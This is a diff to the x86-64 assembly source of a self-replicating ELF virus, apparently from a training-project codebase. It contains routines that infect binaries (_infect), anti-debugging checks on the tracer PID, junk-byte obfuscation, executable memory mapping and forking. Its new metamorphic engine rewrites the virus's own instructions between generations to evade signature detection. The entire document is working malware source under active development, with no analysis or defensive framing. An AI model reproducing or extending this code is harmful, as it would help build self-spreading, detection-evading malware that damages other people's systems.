@@ -67,7 +67,7 @@ _h3ll0w0rld:
 		nop
 
 		jmp $+6
-		db `\x42\x42\x48\xbf`; TRASH ; 42; 42; mov rdi,
+		db `\x42\x42\x48\x8b`; TRASH ; 42; 42; mov rdi,
 
 		push SYSCALL_OPEN
 		pop rax
@@ -107,11 +107,13 @@ _h3ll0w0rld:
 
 		lea rdx, [rel tracer_pid]
 
-		jmp $+6
-		db `\x42\x58\x48\xbf`; TRASH;
+		jmp $+4
+		db `\x42\x58`; TRASH;
 
 		push 13
+		nop
 		pop rcx
+		nop
 		call _ft_memmem
 
 		jmp $+4
@@ -121,8 +123,7 @@ _h3ll0w0rld:
 
 		pop rdi
 		push rax
-		push SYSCALL_CLOSE
-		pop rax
+		mov rax, SYSCALL_CLOSE
 		syscall
 		pop rax
 
@@ -149,9 +150,10 @@ _h3ll0w0rld:
 		sub rsi, 8 * 3
 		add rsi, [rel length]
 		push 0x7
+		nop
 		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
-		push 10
-		pop rax ; mprotect
+		nop
+		mov rax, SYSCALL_MPROTECT; mprotect
 		syscall; change protect from file to _eof
 
 		lea rdi, [rel fingerprint]
@@ -178,7 +180,9 @@ _h3ll0w0rld:
 	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
 	.happy_mix:
 	push 2
+	nop
 	pop rdi
+	nop
 	lea rsi, [rel debugging]
 	jmp $+6
 	mov rax, 0x58016a5a0c6a3713; push 12; pop rdx; push 1; pop rax
@@ -201,8 +205,7 @@ _h3ll0w0rld:
 
 	.host:
 %ifndef DEBUG
-	push SYSCALL_FORK
-	pop rax; fork
+	mov rax, SYSCALL_FORK; fork
 	syscall
 
 	cmp rax, 0x0
@@ -217,8 +220,7 @@ _h3ll0w0rld:
 	jmp _exit
 	.infected:
 %ifndef DEBUG
-		push SYSCALL_FORK
-		pop rax; fork
+		mov rax, SYSCALL_FORK; fork
 		syscall
 
 		cmp rax, 0x0
@@ -385,17 +387,20 @@ _virus:
 	lea r8, [rel _params]
 	sub rsi, r8
 	push 7
+	nop
 	pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
+	nop
 	push 34
+	nop
 	pop r10; MAP_PRIVATE | MAP_ANON
+	nop
 	push -1
 	pop r8 ; fd
 	xor r9, r9; offset
 	nop
 	nop
 	nop
-	push SYSCALL_MMAP
-	pop rax; mmap
+	mov rax, SYSCALL_MMAP; mmap
 	syscall
 
 	push rsi; save length
@@ -444,8 +449,7 @@ _virus:
 	pop rsi ; pop length
 
 	; munmap the previous exec
-	push SYSCALL_MUNMAP
-	pop rax
+	mov rax, SYSCALL_MUNMAP
 	syscall
 	pop rdx
 
@@ -1271,6 +1275,7 @@ _infect:
 	add [rbx + phdr.p_memsz], rdx; p_memsz + virus
 ret
 
+; I'm a pokemon
 _metamorph:; (rdi -> ptr)
 	; xor_encrypt
 	; swap registry r8, r9 -> r9, r10 -> ... -> r14, r15 -> r8, r9 -> ...
@@ -1370,16 +1375,23 @@ _metamorph:; (rdi -> ptr)
 		push rax
 		add rdi, rcx
 		push rsi
-		cmp word[rdi], `\x48\x31`
+		cmp word[rdi], `\x48\x31` ; xor rXX, rXX
 		je .swap_instruction_pattern_a
-		cmp word[rdi], `\x4d\x31`
+		cmp word[rdi], `\x4d\x31`; xor rY, rY (Y=8..15)
 		je .swap_instruction_pattern_b
-		cmp dword[rdi + 1], `\x00\x00\x00\x00`
+		cmp dword[rdi + 1], `\x00\x00\x00\x00`; mov rXX, 0
 		je .swap_instruction_pattern_c
-		cmp byte[rdi], 0x41
+		cmp byte[rdi], 0x41; mov rY, 0
 		je .swap_instruction_pattern_d
+		cmp byte[rdi], 0x6a; push N pop rXX
+		je .swap_instruction_pattern_e
+		xor rdx, rdx
+		mov dl, byte[rdi]
+		and dl, 0xb0; mov RXX, N
+		cmp dl, 0xb0
+		jz .swap_instruction_pattern_f
 		jmp .inc_rcx
-		.swap_instruction_pattern_a:
+		.swap_instruction_pattern_a:; xor rax, rax; nop; nop; nop-> mov rax, 0; nop
 			cmp byte[rdi + 3], 0x90
 			jne .inc_rcx
 			cmp word[rdi + 4], 0x9090
@@ -1405,7 +1417,7 @@ _metamorph:; (rdi -> ptr)
 			mov byte[rdi], dl
 			mov dword[rdi + 1], 0x00000000
 			jmp .inc_rcx
-		.swap_instruction_pattern_b:
+		.swap_instruction_pattern_b:; xor r8, r8; nop; nop; nop -> mov r8, 0
 			cmp byte[rdi + 3], 0x90
 			jne .inc_rcx
 			cmp word[rdi + 4], 0x9090
@@ -1432,7 +1444,7 @@ _metamorph:; (rdi -> ptr)
 			mov byte[rdi + 1], dl
 			mov dword[rdi + 2], 0x00000000
 			jmp .inc_rcx
-		.swap_instruction_pattern_c:
+		.swap_instruction_pattern_c:; mov rax, 0; nop -> xor rax, rax; nop; nop; nop
 			cmp byte[rdi + 5], 0x90
 			jne .inc_rcx
 			call _yes_or_no
@@ -1458,7 +1470,7 @@ _metamorph:; (rdi -> ptr)
 			mov word[rdi + 3], 0x9090
 			mov byte[rdi + 5], 0x90
 			jmp .inc_rcx
-		.swap_instruction_pattern_d:
+		.swap_instruction_pattern_d:; mov r8, 0 -> xor r8, r8; ;nop; nop; nop
 			cmp dword[rdi + 2], 0x00000000
 			jne .inc_rcx
 			call _yes_or_no
@@ -1483,6 +1495,35 @@ _metamorph:; (rdi -> ptr)
 			mov byte[rdi + 2], dl
 			mov word[rdi + 3], 0x9090
 			mov byte[rdi + 5], 0x90
+			jmp .inc_rcx
+		.swap_instruction_pattern_e:; push 9; nop; pop rax; nop -> mov rax, 9
+			cmp byte[rdi + 2], 0x90
+			jne .inc_rcx
+			cmp byte[rdi + 4], 0x90
+			jne .inc_rcx
+			call _yes_or_no
+			cmp rax, 0x0
+			jne .inc_rcx
+			mov dl, byte[rdi + 3]
+			add dl, 0x60
+			mov byte[rdi], dl
+			mov word[rdi + 2], 0x0000
+			mov byte[rdi + 4], 0x0
+			jmp .inc_rcx
+		.swap_instruction_pattern_f:; mov rax, 9 -> push 9; nop; pop rax; nop
+			cmp word[rdi + 2], 0x0000
+			jne .inc_rcx
+			cmp byte[rdi + 4], 0x00
+			jne .inc_rcx
+			call _yes_or_no
+			cmp rax, 0x0
+			jne .inc_rcx
+			mov dl, byte[rdi]
+			sub dl, 0x60
+			mov byte[rdi], 0x6a
+			mov byte[rdi + 2], 0x90
+			mov byte[rdi + 3], dl
+			mov byte[rdi + 4], 0x90
 			jmp .inc_rcx
 		.inc_rcx:
 			pop rsi
